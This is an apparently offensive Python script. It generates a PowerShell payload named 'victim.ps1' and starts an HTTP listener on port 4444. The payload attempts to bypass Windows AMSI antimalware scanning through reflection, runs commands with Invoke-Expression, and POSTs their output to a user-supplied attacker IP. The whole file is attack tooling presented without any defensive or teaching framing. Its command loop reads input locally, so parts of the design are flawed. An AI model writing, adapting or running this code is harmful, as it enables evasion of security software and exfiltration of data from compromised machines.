import http.server
import socketserver
listener_port = 4444
data = input("IP: ")
with open('victim.ps1', 'w') as file:
    file.write(f'''
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null,(New-Object System.Management.Automation.AmsiUtils).amsiSession)

function Execute-Command {{
    param (
        [string]$cmd
    )

    $output = Invoke-Expression $cmd 2>&1
    $outputString = $output -join "`n"
    $outputString
}}

$attackerIP = "{data}"

while ($true) {{
    $command = Read-Host "Shell> "
    $result = Execute-Command $command
    Invoke-RestMethod -Uri ("http://{data}:4444") -Method POST -Body $result
}}
''')

class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        command_result = self.rfile.read(content_length).decode('utf-8')
        print(f"Command Result: \n{command_result}")

with socketserver.TCPServer(("0.0.0.0", listener_port), RequestHandler) as httpd:
    print(f"Started to Listen. Port:{listener_port}")
    httpd.serve_forever()
